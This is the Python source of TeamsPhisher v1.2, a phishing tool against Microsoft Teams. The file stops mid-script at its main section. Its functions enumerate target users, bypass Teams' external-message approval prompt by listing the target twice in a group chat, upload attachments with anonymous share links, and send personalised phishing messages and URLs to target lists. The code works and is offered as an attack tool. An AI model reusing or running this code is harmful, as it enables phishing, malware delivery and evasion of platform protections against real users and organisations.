#!/usr/bin/python3

import argparse
import requests
import json
import os.path
import jinja2
import sys
import time
from msal import PublicClientApplication
from colorama import Fore, Style
import datetime
from os.path import expanduser
import hashlib
from string import Template
from csv import DictReader


## Global Options and Variables ##
# Greeting: The greeting to use in messages sent to targets. Will be joined with the targets name if the --personalize flag is used
# Examples: "Hi" "Good Morning" "Greetings"
Greeting = "Hi"

# useragent: The useragent string to use for web requests
useragent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)"

# fd: The file descriptor used for logging operations
fd = None

# version: TeamsPhisher version used in banner
__version__ = "1.2"

# Consumer and organizations application ids
msids = {
    "consumers": {
        "authority": "https://login.microsoftonline.com/consumers",
        "teams": {
            "scope": "service::api.fl.teams.microsoft.com::MBI_SSL",
            "id": "8ec6bc83-69c8-4392-8f08-b3c986009232"
        },
        "onedrive": {
            "scope": "service::lw.onedrive.com::MBI_SSL",
            "id": "4b3e8f46-56d3-427f-b1e2-d239b2ea6bca"
        },
        "skype": {
            "scope": "service::api.fl.spaces.skype.com::MBI_SSL",
            "id": "4b3e8f46-56d3-427f-b1e2-d239b2ea6bca"
        },
        "teamsgroupssvc": {
            "scope": "https://groupssvc.fl.teams.microsoft.com/teams.readwrite",
            "id": "8ec6bc83-69c8-4392-8f08-b3c986009232"
        }
    },
    "organizations": {
        "authority": Template("https://login.microsoftonline.com/$tenant"),
        "teams": {
            "scope": "https://api.spaces.skype.com/.default",
            "id": "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
        },
        "sharepoint": {
            "scope": Template("https://$tenant-my.sharepoint.com/.default"),
            "id": "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
        }
    }
}

def p_err(msg, exit):
    output = Fore.RED + "[-] " + msg + Style.RESET_ALL
    print(output)
    if fd:
        p_file(output, True)
    if exit:
        sys.exit(-1)

def p_warn(msg):
    output = Fore.YELLOW + "[-] " + msg + Style.RESET_ALL
    print(output)
    if fd:
        p_file(output, True)

def p_success(msg):
    output = Fore.GREEN + "[+] " + msg + Style.RESET_ALL
    print(output)
    if fd:
        p_file(output, True)

def p_info(msg):
    output = Fore.CYAN + msg + Style.RESET_ALL
    print(output)
    if fd:
        p_file(output, True)

def p_task(msg):
    bufferlen = 75 - len(msg)
    output = msg + "." * bufferlen
    print(output, end="", flush=True)
    if fd:
        p_file(output, False)

def p_file(msg, newline):
    fd.write(msg)
    if newline:
        fd.write("\n")
    fd.flush()

def hashFile(file):
    md5 = hashlib.md5()
    sha1 = hashlib.sha1()
    sha256 = hashlib.sha256()

    with open(file, 'rb') as f:
        data = f.read()
    f.close()

    md5.update(data)
    sha1.update(data)
    sha256.update(data)

    p_success("MD5: %s" % (md5.hexdigest()))
    p_success("SHA1: %s" % (sha1.hexdigest()))
    p_success("SHA256: %s" % (sha256.hexdigest()))

def getTenantID(username):

   domain = username.split("@")[-1]

   response = requests.get("https://login.microsoftonline.com/%s/.well-known/openid-configuration" % (domain))

   if response.status_code != 200:
      p_err("Could not retrieve tenant id for domain %s" % (domain), True)

   json_content = json.loads(response.text)
   tenant_id = json_content.get('authorization_endpoint').split("/")[3]

   return tenant_id

def twoFAlogin(username, scope, app):

    try:
        # Initiate the device code authentication flow and print instruction message
        flow = app.initiate_device_flow(scopes=[scope])
        if "user_code" not in flow:
            p_err("Could not retrieve user code in authentication flow", exit=True)
        p_warn(flow.get("message"))
    except:
        p_err("Could not initiate device code authentication flow", exit=True)

    # Initiates authentication based on the previously created flow. Polls the MS endpoint for entered device codes.
    try:
        result = app.acquire_token_by_device_flow(flow)
    except Exception as err:
        p_err("Error while authenticating: %s" % (err.args[0]), exit=True)
    
    return result

def getBearerToken(username, scope, appid, authority, password=None):

    result = None

    # Get ClientApplication
    app = PublicClientApplication( appid, authority=authority )
    
    if password is None:
        result = twoFAlogin(username, scope, app)
    else:
        try:
            # Initiates authentication based on credentials.
            result = app.acquire_token_by_username_password(username, password, scopes=[scope])
        except ValueError as err:
            if "This typically happens when attempting MSA accounts" in err.args[0]:
                p_warn("Username/Password authentication cannot be used with Microsoft accounts. Either use the device code authentication flow or try again with a user managed by an organization.")
            p_err("Error while acquring token", True)

    # Login not successful
    if "access_token" not in result:
        if "Error validating credentials due to invalid username or password" in result.get("error_description"):
            p_err("Invalid credentials entered", True)
        elif "This device code has expired" in result.get("error_description"):
            p_err("The device code has expired. Please try again", True)
        elif "multi-factor authentication" in result.get("error_description"):
            result = twoFAlogin(username, scope, app)
        else:
            p_err(result.get("error_description"), True)

    p_success("SUCCESS!")
    return result

def getSkypeToken(bearer):

    headers = {
        "Authorization": "Bearer " + bearer["access_token"]
    }

    if bearer["scope"] == msids["consumers"]["skype"]["scope"]:
        # consumer
        p_task("Fetching Skype consumer token...")
        content = requests.post("https://teams.live.com/api/auth/v1.0/authz/consumer", headers=headers)
    else:
        # business
        # Requests a Skypetoken
        # https://digitalworkplace365.wordpress.com/2021/01/04/using-the-ms-teams-native-api-end-points/
        content = requests.post("https://authsvc.teams.microsoft.com/v1.0/authz", headers=headers)

    if content.status_code != 200:
        p_err("Error fetching skype token: %d" % (content.status_code), True)

    json_content = json.loads(content.text)
    if "tokens" in json_content:
        p_success("SUCCESS!")
        return json_content.get("tokens").get("skypeToken")
    elif "skypeToken" in json_content:
        p_success("SUCCESS!")
        return json_content.get("skypeToken").get("skypetoken")
    else:
        p_err("Could not retrieve Skype token", True)

def getSenderInfo(token, msa=False):
    p_task("Fetching sender info...")

    displayName = None
    userID = None
    skipToken = None
    senderInfo = None

    if msa:
        headers = {
            "Authentication": "skypetoken=%s" % (token),
            "Referer": "https://teams.live.com/"
        }
        response = requests.get(
            "https://msgapi.teams.live.com/v1/users/ME/properties",
            headers=headers)
        senderInfo = json.loads(response.text)
        p_info("Sender Info: %s" % json.dumps(senderInfo))
        senderInfo["id"] = senderInfo["mri"] = "8:"+senderInfo["skypeName"]
        return senderInfo
    else:
        headers = {
            "Authorization": "Bearer %s" % (token["access_token"])
        }

        # First request fetches userID associated with our sender/bearer token
        response = requests.get(
            "https://teams.microsoft.com/api/mt/emea/beta/users/tenants",
            headers=headers)

        if response.status_code != 200:
            p_err("Could not retrieve senders userID!", True)

        # Store userID as well as the tenantName of our sending user
        userID = json.loads(response.text)[0].get('userId')
        tenantName = json.loads(response.text)[0].get('tenantName')

        # Second, we need to find the display name associated with our userID
        # Enumerate users within sender's tenant and find our matching user
        while True:
            url = "https://teams.microsoft.com/api/mt/emea/beta/users"
            if skipToken:
                url += f"?skipToken={skipToken}&top=999"

            response = requests.get(url, headers=headers)

            if response.status_code != 200:
                p_err("Could not retrieve senders display name!", True)

            users_response = json.loads(response.text)
            users = users_response['users']
            skipToken = users_response.get('skipToken')

            # Iterate through retrieved users and find the one that matches our previously retrieved UserID.
            for user in users:
                if user.get('id') == userID:
                    senderInfo = user
                    break

            if senderInfo or not skipToken:
                break

        # Add tenantName to our senderInfo data for later
        # Populating tenantName by parsing UPN because ran into issues where peoples 'Organization Name' differed from their 'Initial Domain Name'
        if senderInfo:
            senderInfo['tenantName'] = senderInfo['userPrincipalName'].split("@")[-1].split(".")[0]
            p_success("SUCCESS!")
        else:
            p_err("Could not find the sender's user information!", True)

    return senderInfo, users

def authenticate(args):

    if args.msa:
        consumers = msids["consumers"]
        bToken = getBearerToken(args.username, consumers["teams"]["scope"], consumers["teams"]["id"], consumers["authority"])
        onedriveToken = getBearerToken(args.username, consumers["onedrive"]["scope"], consumers["onedrive"]["id"], consumers["authority"])
        skypeToken = getSkypeToken(getBearerToken(args.username, consumers["skype"]["scope"], consumers["skype"]["id"], consumers["authority"]))
        teamsgroupssvcToken = getBearerToken(args.username, consumers["teamsgroupssvc"]["scope"], consumers["teamsgroupssvc"]["id"], consumers["authority"])
        senderInfo = getSenderInfo(skypeToken, msa=True)
        return bToken, skypeToken, onedriveToken, teamsgroupssvcToken, senderInfo, None
    else:
        # If given username (+ password)
        if args.username:
            organizations = msids["organizations"]
            authority = organizations["authority"].substitute(tenant=getTenantID(args.username))
            bToken = getBearerToken(args.username, organizations["teams"]["scope"], organizations["teams"]["id"], authority, args.password)
            skypeToken = getSkypeToken(bToken)
            senderInfo, senderUsers = getSenderInfo(bToken)
            # Fetch sharepointToken passing in alternate vars for scope depending on whether specified a specific sharepoint domain to use.
            sharepointScope = organizations["sharepoint"]["scope"].substitute(tenant=senderInfo.get('tenantName'))
            sharepointToken = getBearerToken(args.username, sharepointScope, organizations["sharepoint"]["id"], authority, args.password)

        # Otherwise fail
        else:
            p_err("You must provide a username AND password!", True)

        return bToken, skypeToken, sharepointToken, None, senderInfo, senderUsers

def findFriendlyName(targetInfo):

    # Check for a space in the display name for an easy win i.e. "Tom Jones"
    if " " in targetInfo.get('displayName'):
        friendlyName = targetInfo.get('displayName').split(" ")[0].capitalize()
    
    # Next we are going to do some guesswork with their UPN i.e. "tom.jones@mytest.onmicrosoft.com"
    elif "@" in targetInfo.get('userPrincipalName'):
        if "." in targetInfo.get('userPrincipalName').split("@"):
            friendlyName = targetInfo.get('userPrincipalName').split("@")[0].split(".")[0].capitalize()
        else:
            friendlyName = targetInfo.get('userPrincipalName').split("@")[0].capitalize()
        
    # Otherwise give up...
    else:
        friendlyName = None

    return friendlyName
    
def jsonifyMessage(message, url=None):
    
    jsonMessage = ""

    # Read in message
    with open(message) as f:
        fileContent = f.read()
    f.close()

    # replace url from jinja2 template
    if url is not None:
        fileContent = jinja2.Template(fileContent).render(url=url)

    # Iterate through lines in message and add proper formatting tags in order to preserve newlines
    for line in fileContent.split("\n"):
        jsonMessage += ("<p>&nbsp;</p>" if line == "" else "<p>%s</p>" % (line))

    return jsonMessage

def enumUser(bearer, email, skypeToken=None):

    headers = {
        "Authorization": "Bearer " + bearer["access_token"],
        "X-Ms-Client-Version": "1415/1.0.0.2023031528",
        "User-Agent": useragent
    }

    if skypeToken is not None:
        headers["X-Skypetoken"] = skypeToken
        headers["Content-Type"] = "application/json;charset=UTF-8"
        url = "https://teams.live.com/api/mt/beta/users/searchUsers"
        user = {"emails":[email],"phones":[]}
        content = requests.post(url,data=json.dumps(user),headers=headers)
    # check if target user tenant is same as sender user tenant (internal org user)
    elif email.split("@")[-1].split(".")[0] == senderInfo['tenantName']:
        for user in senderUsers:
            if user['userPrincipalName'] == email:
                return user
    else:
        content = requests.get("https://teams.microsoft.com/api/mt/emea/beta/users/%s/externalsearchv3?includeTFLUsers=true" % (email), headers=headers)

    if content.status_code == 403:
        p_warn("User exists but the target tenant or your tenant disallow communication to external domains.")
        return None

    if content.status_code == 401:
        p_err("Unable to enumerate user. Is the access token valid?", True)

    if content.status_code != 200 or ( content.status_code == 200 and len(content.text) < 3 ):
        p_warn("Unable to enumerate user. User does not exist, is not Teams-enrolled, is part of senders tenant, or is configured to not appear in search results.")
        return None

    if skypeToken is not None:
        user_profile = json.loads(content.text)[email]["userProfiles"][0]
    else:
        user_profile = json.loads(content.text)[0]
           
    if "sfb" in user_profile['mri']:
        p_warn("This user has a Skype for Business subscription and cannot be sent files.")
        return None
    else:
        return user_profile

def uploadFile(Token, attachment, senderSharepointURL=None, senderDrive=None):

    p_task("Uploading file: %s" % (attachment))

    if senderDrive is None:
        # Assemble upload URL (OneDrive)
        url = "https://api.onedrive.com/v1.0/drive/root:/Microsoft%%20Teams%%20Chat%%20Files/%s:/content?@name.conflictBehavior=replace" % os.path.basename(attachment)
        headers = {
            "Authorization": "WLID1.1 " + Token["access_token"],
            "User-Agent": useragent,
            "Content-Type": "application/octet-stream",
            "Origin": "https://teams.microsoft.com",
            "Referer": "https://teams.microsoft.com/"
        }
    else:
        # Assemble upload URL (SharePoint)
        url = "%s/personal/%s/_api/v2.0/drive/root:/Microsoft%%20Teams%%20Chat%%20Files/%s:/content?@name.conflictBehavior=replace&$select=*,sharepointIds,webDavUrl" % (senderSharepointURL, senderDrive, os.path.basename(attachment))
        headers = {
            "Authorization": "Bearer " + Token["access_token"],
            "User-Agent": useragent,
            "Content-Type": "application/octet-stream",
            "Origin": "https://teams.microsoft.com",
            "Referer": "https://teams.microsoft.com/"
        }

    # Read local file
    with open(attachment, mode="rb") as file:
        contents = file.read()

    # Upload file
    content = requests.put(url, headers=headers, data=contents)

    # Seem to have seen both of these codes for file uploads...
    if content.status_code != 201 and content.status_code != 200:
        p_err("Error uploading file: %d" % (content.status_code), True)

    # Parse out the uploadID. We will need this to craft our invite link
    uploadInfo = json.loads(content.text)

    p_success("SUCCESS!")

    return uploadInfo



def createThread(skypeToken, senderInfo, targetInfo, teamsgroupssvcToken=None):

    # Body of new thread request.
    # Sending target user MRI TWICE to create a "group chat" in order to bypass "external user message approval" prompt
    # See https://posts.inthecyber.com/leveraging-microsoft-teams-for-initial-access-42beb07f12c4
    body = """{"members":[{"id":\"""" + senderInfo.get('mri') + """\","role":"Admin"},{"id":\"""" + targetInfo.get('mri') + """\","role":"Admin"},{"id":\"""" + targetInfo.get('mri') + """\","role":"Admin"}],"properties":{"threadType":"chat","chatFilesIndexId":"2","cfet":"true"}}"""

    if teamsgroupssvcToken is None:
        headers = {
            "Authentication": "skypetoken=" + skypeToken,
            "User-Agent": useragent,
            "Content-Type": "application/json",
            "Origin": "https://teams.microsoft.com",
            "Referer": "https://teams.microsoft.com/"
        }
        # Create chat thread
        content = requests.post("https://amer.ng.msg.teams.microsoft.com/v1/threads", headers=headers, data=body)
    else:
        headers = {
            "Authorization": "Bearer " + teamsgroupssvcToken["access_token"],
            "X-Skypetoken": skypeToken,
            "User-Agent": useragent,
            "Content-Type": "application/json",
            "Origin": "https://teams.live.com",
            "Referer": "https://teams.live.com/"
        }
        # Create chat thread
        content = requests.post("https://teams.live.com/api/groups/beta/groups/create", headers=headers, data=body)

    if content.status_code != 201 and content.status_code != 200:
        p_warn("Error creating chat: %d" % (content.status_code))
        return None

    threadID = content.headers.get('Location').split("/")[-1]

    return threadID

def removeExternalUser(skypeToken, senderInfo, threadID, targetInfo, msa=False):
    headers = {
        "Authentication": "skypetoken=" + skypeToken,
        "User-Agent": useragent,
        "Content-Type": "application/json",
        "Origin": "https://teams.microsoft.com",
        "Referer": "https://teams.microsoft.com/"
    }

    # Get the current thread information
    if msa:
        baseUrl = "https://msgapi.teams.live.com"
    else:
        baseUrl = "https://amer.ng.msg.teams.microsoft.com"
    
    response = requests.get(f"{baseUrl}/v1/threads/{threadID}", headers=headers)
    
    if response.status_code != 200:
        p_warn("Error retrieving thread information: %d" % (response.status_code))
        return None

    thread = response.json()

    # Delete the target user from the thread
    content = requests.delete(f"{baseUrl}/v1/threads/{threadID}/members/{senderInfo.get('mri')}", headers=headers)
    if content.status_code != 204 and content.status_code != 200:
        p_warn("Error removing user: %d" % (content.status_code))
        p_warn(content.text)
        return None


def sendMessage(skypeToken, threadID, senderInfo, targetInfo, inviteInfo, senderSharepointURL, senderDrive, attachment, message, personalize, nogreeting, msa=False, targetUrl=None, displayname=None):

    if msa:
        baseUrl = "https://msgapi.teams.live.com"
    else:
        baseUrl = "https://amer.ng.msg.teams.microsoft.com"

    # Sending a real message to a target
    if threadID:
        url = baseUrl + "/v1/users/ME/conversations/" + threadID + "/messages"
    
    # Sending a test message to ourselves
    else:
        url = baseUrl + "/v1/users/ME/conversations/" + "/48%3Anotes/messages"

    headers = {
        "Authentication": "skypetoken=" + skypeToken,
        "User-Agent": useragent,
        "Content-Type": "application/json, Charset=UTF-8",
        "Origin": "https://teams.microsoft.com",
        "Referer": "https://teams.microsoft.com/",
    }

    # Format supplied message to be json friendly
    jsonMsg = jsonifyMessage(message, targetUrl)

    # If --nogreeting specified, initialize introduction
    if nogreeting:
        introduction = ""
    # Otherwise standard behavior is to use pre-set greeting 
    else:
        # Initialize standard greeting
        introduction = "<p>%s,</p><p>&nbsp;</p>" % (Greeting)

        # If personalizing, try and fetch friendly name for target and add to greeting
        if personalize:
            friendlyName = findFriendlyName(targetInfo)
            if friendlyName:
                introduction = "<p>%s %s,</p><p>&nbsp;</p>" % (Greeting, friendlyName)

    # Assemble final message
    assembledMessage = introduction + jsonMsg

    if msa:
        if inviteInfo is None:
            filesLink = ""
        else:
            filesLink = """
            "files": "[{\\"@type\\":\\"http://schema.skype.com/File\\",\\"version\\":2,\\"id\\":\\"%s\\",\\"baseUrl\\":\\"\\",\\"type\\":\\"%s\\",\\"title\\":\\"%s\\",\\"state\\":\\"active\\",\\"objectUrl\\":\\"%s\\",\\"itemid\\":\\"%s\\",\\"fileName\\":\\"%s\\",\\"fileType\\":\\"%s\\",\\"fileInfo\\":{\\"itemId\\":\\"%s\\",\\"fileUrl\\":\\"%s\\",\\"siteUrl\\":\\"\\",\\"serverRelativeUrl\\":\\"\\",\\"shareUrl\\":\\"%s\\",\\"shareId\\":\\"%s\\"},\\"botFileProperties\\":{},\\"filePreview\\":{},\\"fileChicletState\\":{\\"serviceName\\":\\"p2p\\",\\"state\\":\\"active\\"}}]",
            """ % (uploadInfo.get('id'), attachment.split(".")[-1], os.path.basename(attachment), uploadInfo.get('webUrl'), uploadInfo.get('id'), os.path.basename(attachment), attachment.split(".")[-1], uploadInfo.get('id'), inviteInfo.get('link').get('webUrl'), inviteInfo.get('link').get('webUrl'), inviteInfo.get('id'))
        body = """{
        "content": "%s",
        "messagetype": "RichText/Html",
        "contenttype": "text",
        "amsreferences": [],
        "clientmessageid": "3529890327684204137",
        "imdisplayname": "%s",
        "properties": {
            %s
            "importance": "",
            "subject": ""
        }
    }""" % (assembledMessage, displayname, filesLink)
    else:
        if inviteInfo is None:
            filesLink = ""
        else:
            filesLink = """
                "files": "[{\\"@type\\":\\"http://schema.skype.com/File\\",\\"version\\":2,\\"id\\":\\"%s\\",\\"baseUrl\\":\\"%s/personal/%s/\\",\\"type\\":\\"%s\\",\\"title\\":\\"%s\\",\\"state\\":\\"active\\",\\"objectUrl\\":\\"%s/personal/%s/Documents/Microsoft%%20Teams%%20Chat%%20Files/%s\\",\\"providerData\\":\\"\\",\\"itemid\\":\\"%s\\",\\"fileName\\":\\"%s\\",\\"fileType\\":\\"%s\\",\\"fileInfo\\":{\\"itemId\\":null,\\"fileUrl\\":\\"%s/personal/%s/Documents/Microsoft%%20Teams%%20Chat%%20Files/%s\\",\\"siteUrl\\":\\"%s/personal/%s/\\",\\"serverRelativeUrl\\":\\"\\",\\"shareUrl\\":\\"%s\\",\\"shareId\\":\\"%s\\"},\\"botFileProperties\\":{},\\"permissionScope\\":\\"anonymous\\",\\"filePreview\\":{},\\"fileChicletState\\":{\\"serviceName\\":\\"p2p\\",\\"state\\":\\"active\\"}}]",
            """ % (uploadInfo.get('sharepointIds').get('listItemUniqueId'), senderSharepointURL, senderDrive, attachment.split(".")[-1], os.path.basename(attachment), senderSharepointURL, senderDrive, os.path.basename(attachment), uploadInfo.get('sharepointIds').get('listItemUniqueId'), os.path.basename(attachment), attachment.split(".")[-1], senderSharepointURL, senderDrive, os.path.basename(attachment), senderSharepointURL, senderDrive, inviteInfo.get('d').get('ShareLink').get('sharingLinkInfo').get('Url'), inviteInfo.get('d').get('ShareLink').get('sharingLinkInfo').get('ShareId'))
        body = """{
            "content": "%s",
            "messagetype": "RichText/Html",
            "contenttype": "text",
            "amsreferences": [],
            "clientmessageid": "3529890327684204137",
            "imdisplayname": "%s",
            "properties": {
                %s
                "importance": "",
                "subject": ""
            }
        }""" % (assembledMessage, displayname, filesLink)
    
    # Send Message
    content = requests.post(url, headers=headers, data=body.encode(encoding='utf-8'))

    if content.status_code != 201:
        p_warn("Error sending message + attachment to user: %d" % (content.status_code))
        return False

    p_success("SUCCESS!")

    return True

def getInviteLink(Token, uploadID, senderDrive=None, senderSharepointURL=None, senderInfo=None, targetInfo=None, secureLink=None):

    # Assemble invite link request URL
    if senderDrive is None:
        url = "https://api.onedrive.com/v1.0/drive/items/%s/oneDrive.createLink" % (uploadID)
        # for MSA accounts we specify anonymous access because of some restrictions when sharing with business accounts. See: https://learn.microsoft.com/en-us/answers/questions/278794/sharing-folders-between-business-personal-onedrive
        body = """
        {
            "type":"view"
        }
        """
        headers = {
            "Authorization": "WLID1.1 " + Token["access_token"],
            "User-Agent": useragent,
            "Accept": "application/jsone",
            "Content-Type": "application/json",
            "Origin": "https://teams.live.com",
            "Referer": "https://teams.live.com/",
        }
    else:
        url = "%s/personal/%s/_api/web/GetFileById(@a1)/ListItemAllFields/ShareLink?@a1=guid%%27%s%%27" % (senderSharepointURL, senderDrive, uploadID)
        # Define two different settings blocks for the request body depending on if we are sending a secure link or not.
        unsecure = """            "allowAnonymousAccess": true,
                "trackLinkUsers": false,
                "linkKind": 4,
                "expiration": null,
                "role": 1,
                "restrictShareMembership": false,
                "updatePassword": false,
                "password": "",
                "scope": 0"""

        secure = """            "linkKind": 6,
                "expiration": null,
                "role": 1,
                "restrictShareMembership": true,
                "updatePassword": false,
                "password": "",
                "scope": 2"""

        if secureLink is None:
            settings = unsecure
        else:
            settings = secure

        # If sender and target info match, this is a test message. Use single recipient PPI
        if(senderInfo == targetInfo):
            # Stitch body together
            body = """
            {
                "request": {
                "createLink": true,
                "settings": {
                    %s
                },
                "peoplePickerInput": "[{\\"Key\\":\\"i:0#.f|membership|%s\\",\\"DisplayText\\":\\"%s\\",\\"IsResolved\\":true,\\"Description\\":\\"%s\\",\\"EntityType\\":\\"User\\",\\"EntityData\\":{\\"IsAltSecIdPresent\\":\\"False\\",\\"Title\\":\\"\\",\\"Email\\":\\"%s\\",\\"MobilePhone\\":\\"\\",\\"ObjectId\\":\\"%s\\",\\"Department\\":\\"\\"},\\"MultipleMatches\\":[],\\"ProviderName\\":\\"Tenant\\",\\"ProviderDisplayName\\":\\"Tenant\\"}]"
                }
            }
            """ % (settings, senderInfo.get('userPrincipalName'), senderInfo.get('displayName'), senderInfo.get('userPrincipalName'), senderInfo.get('userPrincipalName'), senderInfo.get('id'))
        
        else:
            # Stitch body together
            body = """
            {
                "request": {
                "createLink": true,
                "settings": {
                    %s
                },
                "peoplePickerInput": "[{\\"Key\\":\\"i:0#.f|membership|%s\\",\\"DisplayText\\":\\"%s\\",\\"IsResolved\\":true,\\"Description\\":\\"%s\\",\\"EntityType\\":\\"User\\",\\"EntityData\\":{\\"IsAltSecIdPresent\\":\\"False\\",\\"Title\\":\\"\\",\\"Email\\":\\"%s\\",\\"MobilePhone\\":\\"\\",\\"ObjectId\\":\\"%s\\",\\"Department\\":\\"\\"},\\"MultipleMatches\\":[],\\"ProviderName\\":\\"Tenant\\",\\"ProviderDisplayName\\":\\"Tenant\\"},{\\"Key\\":\\"%s\\",\\"DisplayText\\":\\"%s\\",\\"IsResolved\\":true,\\"Description\\":\\"%s\\",\\"EntityType\\":\\"\\",\\"EntityData\\":{\\"SPUserID\\":\\"%s\\",\\"Email\\":\\"%s\\",\\"IsBlocked\\":\\"False\\",\\"PrincipalType\\":\\"UNVALIDATED_EMAIL_ADDRESS\\",\\"AccountName\\":\\"%s\\",\\"SIPAddress\\":\\"%s\\",\\"IsBlockedOnODB\\":\\"False\\"},\\"MultipleMatches\\":[],\\"ProviderName\\":\\"\\",\\"ProviderDisplayName\\":\\"\\"}]"
                }
            }
            """ % (settings, senderInfo.get('userPrincipalName'), senderInfo.get('displayName'), senderInfo.get('userPrincipalName'), senderInfo.get('userPrincipalName'), senderInfo.get('id'), targetInfo.get('userPrincipalName'), targetInfo.get('userPrincipalName'), targetInfo.get('userPrincipalName'), targetInfo.get('userPrincipalName'), targetInfo.get('userPrincipalName'), targetInfo.get('userPrincipalName'), targetInfo.get('userPrincipalName'))

        headers = {
            "Authorization": "Bearer " + Token["access_token"],
            "User-Agent": useragent,
            "Accept": "application/json;odata=verbose",
            "Content-Type": "application/json;odata=verbose",
            "Origin": "https://www.odwebp.svc.ms/",
            "Referer": "https://www.odwebp.svc.ms/",
        }

    # Send request
    content = requests.post(url, headers=headers, data=body)

    if content.status_code != 200 and content.status_code != 201:
        p_warn("Error fetching sharing link: %d" % (content.status_code))
        print(content.text)
        return None

    # Parse out the sharing URL that we need to send to our user
    inviteInfo = json.loads(content.text)

    return inviteInfo






banner = """
                                    ...                                               
                                :-++++++=-.                                           
                              .=+++++++++++-                                          
                             .++++++++++++++=     :------:                            :-:--.                    
                             :+++++++++++++++.  .----------                           #= .-+.                   
                             :+++++++++++++++.  -----------:                         :#=  :#.                   
        :--------------------------=++++++++-  .------------                          .=+  ++                   
        ----------------------------+++++*+-.   :+=-----===:                          -+-.+:                    
        :---------------------------++++=-.      .=+++++=-.                           .=+:.                    
        :------=%%%%%%%%%%%%%%%%%%%%%%%%--------:...           .:::..                              -*=-:                   
        :------=****#@@#****--------=++++++++++++++-----------.                        -#++-                    
        :----------:+@@+:-----------+++++++++++++++=-----------                        -#++-                     
        :-----------+@@*------------+++++++++++++++=-----------.                       -*+*-                    
        :-----------+@@*------------+++++++++++++++=-----------.                   .   -*++-                    
        :-----------+@@*------------+++++++++++++++=-----------.                   --  -*++-                    
        :-----------+@@*------------+++++++++++++++=-----------.           .       ==  -*++-                .=                     
        :-----------+@@+------------+++++++++++++++=-----------.          .+       -=  :+==-                .*                     
        :---------------------------+++++++++++++++=-----------.          =*       -=  -+=+=                .::                    
        ----------------------------+++++++++++++++=-----------           **       -+  -+=++.               .*=                     
        .:-------------------------=+++++++++++++++=---------=:           #+       :=  ++-:*=                ==                    
                        -++++++++++++++++++++++++++=-------=+=:          :#=       .:. *=: -*-               ==                     
                        .=+++++++++++++++++++++++++*+++++++=-.           -#-        ::++=   :+=.            .==                     
                        :++++++++++++++++++++++++=:.:::::.               -*:        .=+-.    .=+-.          -+:                    
                        .=+*+++++++++++++++++++-                         -+-      .:-=.        .-====----:-==:                    
                            .-+**+++++++++++**+-.                        .++:   .-=-:             .:-====-:.                      
                            :-=++******+=-:                               .=+===--.                  
                                ..:::..                                      ...                     
                                            
                           _____                            ______  _      _       _                 
                          |_   _|                           | ___ \\| |    (_)     | |                
                            | |  ___   __ _  _ __ ___   ___ | |_/ /| |__   _  ___ | |__    ___  _ __ 
                            | | / _ \\ / _` || '_ ` _ \\ / __||  __/ | '_ \\ | |/ __|| '_ \\  / _ \\| '__|
                            | ||  __/| (_| || | | | | |\\__ \\| |    | | | || |\\__ \\| | | ||  __/| |   
                            \\_  \\___| \\__,_||_| |_| |_||___/\\_|    |_| |_||_||___/|_| |_| \\___||_|   
                                                                                                                                                                    
                            v%s developed by %s\n""" % (__version__, "@Octoberfest73 (https://github.com/Octoberfest7)")

if __name__ == "__main__":
    print(banner)

    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--username', dest='username', type=str, required=True,  help='Username for authentication')
    parser.add_argument('-p', '--password', dest='password', type=str, required=False, help='Password for authentication')
    parser.add_argument('-a', '--attachment', dest='attachment', type=str, required=False, help='Full path to the attachment to send to targets.')
    parser.add_argument('-m', '--message', dest='message', type=str, required=True, help='A file containing a message to send with attached file.')
    parser.add_argument('-s', '--sharepoint', dest='sharepoint', type=str, required=False, help='Manually specify sharepoint name (e.g. mytenant.sharepoint.com would be --sharepoint mytenant)')  
    parser.add_argument('--msa', dest='msa', action="store_true", help='Use MSA account instead of organizational account type.')

    # Target group. Choose either a single email or a list of emails.
    parser_target_group = parser.add_mutually_exclusive_group(required=True)
    parser_target_group.add_argument('-e', '--targetemail', dest='email', type=str, required=False, help='Single target email address')
    parser_target_group.add_argument('-c', '--csvlist', dest='csvlist', type=str, required=False, help='Full path to a csv file containing targets with unique phishing URL (e.g. Gophish).')
    parser_target_group.add_argument('-l', '--list', dest='list', type=str, required=False, help='Full path to a file containing target emails. One per line.')

    parser.add_argument('--displayname', dest='displayname', type=str, required=False, help='Specify custom Teams displayname')
    parser.add_argument('--url', dest='url', type=str, required=False, help='Specify phishing URL for single target or when using in preview mode.')
    parser.add_argument('--greeting', dest='greeting', type=str, required=False, help='Override default greeting with a custom one. Use double quotes if including spaces!')
    parser.add_argument('--securelink', dest='securelink', action='store_true', required=False, help='Send link to file only viewable by the individual target recipient.')
    parser.add_argument('--personalize', dest='personalize', action='store_true', required=False, help='Try and use targets names in greeting when sending messages.') 
    parser.add_argument('--preview', dest='preview', action='store_true', required=False, help='Run in preview mode. See personalized names for targets and send test message to sender\'s Teams.')         
    parser.add_argument('--delay', dest='delay', type=int, required=False, default=0, help='Delay in [s] between each attempt. Default: 0')
    parser.add_argument('--nogreeting', dest='nogreeting', action='store_true', required=False, help='Do not use built in greeting or personalized names, only send message specified with --message')
    parser.add_argument('--log', dest='log', action='store_true', required=False, help='Write TeamsPhisher output to logfile')

    args = parser.parse_args()

    # If logging, open file and write commandline + banner
    if args.log:
        dt = datetime.datetime.now()
        logfile = "%s/%s" % (expanduser("~"), dt.strftime('%H-%M_%d%b%y_teamsphisher.log'))
        fd = open(logfile, 'w')
        fd.write(" ".join(sys.argv) + "\n")
        fd.write(banner)
        fd.flush()

    p_info("\nConfiguration:\n")

    if args.personalize:
        p_success("Try to personalize greeting by using targets first name")
        
    if args.securelink:
        p_success("Sending secure file link that is only viewable by target and requires target authentication")
    else:
        p_warn("Sending file link that is accessible by anyone with the link")

    if args.delay:
        p_success("Waiting %d seconds between each message" % (args.delay))
    else:
        p_warn("No delay between messages")

    if args.nogreeting:
        p_warn("Built-in greeting disabled; did you specify one in your message?")
    else:
        if args.greeting:
            Greeting = args.greeting
        p_success("Using greeting: %s, --personalize greeting: %s <Name>," % (Greeting, Greeting))
    
    if args.sharepoint:
        p_success("Using manually specified sharepoint name: %s" % (args.sharepoint))
    else:
        p_warn("Resolving sharepoint name automatically- if your tenant uses a custom domain you might have issues!")

    if args.log:
        p_success("Logging TeamsPhisher output at: %s" % (logfile))
    else:
        p_warn("Not logging TeamsPhisher output")

    if args.preview:
